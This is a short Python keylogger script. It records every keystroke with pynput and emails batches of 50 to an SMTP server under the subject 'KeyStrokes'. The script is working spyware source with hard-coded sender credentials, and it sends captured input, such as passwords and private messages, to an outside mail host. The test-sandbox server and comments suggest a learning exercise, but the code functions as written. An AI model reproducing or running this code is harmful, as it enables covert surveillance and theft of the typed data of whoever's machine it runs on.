from pynput.keyboard import Key, Listener
from send_mail import *
import smtplib, ssl  

class send_mail:
        
    def sendEmail(message):
        smtp_server = "sandbox.smtp.mailtrap.io"
        port = 2525

        sender_email = "1896b255dafd25"           #Put sender and receiver email the same for testing
        password = "91b47a09e75255"                  #Put password of the sender's email id
        receiver_email = "1896b255dafd25"
        
        
        context = ssl.create_default_context()

        try:
            
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_email, password)
            message = f'Subject: {"KeyStrokes"}\n\n{message}'
            server.sendmail(sender_email, receiver_email, message)
            
        except Exception as e:
            print("ERROR DETECTED",e)
        finally:
            print("closing connection")
            server.quit()


count = 0
keys = []


def on_press(key):
    global keys, count

    # Appending the keys as a string into
    # the empty list and increment count
    keys.append(str(key))
    print(f"{key} pressed")
    count += 1

    # if count is not 0 and
    # enter is pressed send report
    # and reset variables
    if count >= 50:
        count = 0
        logs = format_logs(keys)
        send_mail.sendEmail(logs)
        keys = []
        print(logs)


def format_logs(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")

        # If spacebar is pressed then put a space
        if key == "Key.space":
            k = " "
        elif key == "Key.shift":
            k = "<shift>"
        elif key == "Key.ctrl_l":
            k = "<ctrl>"
        elif key == "Key.alt_l":
            k = "<alt>"
        elif key == "Key.tab":
            k = "<tab>"
        elif key == "Key.caps_lock":
            k = "<caps_lock>"
        elif key == "Key.enter":
            k = "<enter>"

        elif key.find("Key") > 0:
              k = ""
        message += k
    return message



with Listener(on_press=on_press) as listener:
    listener.join()
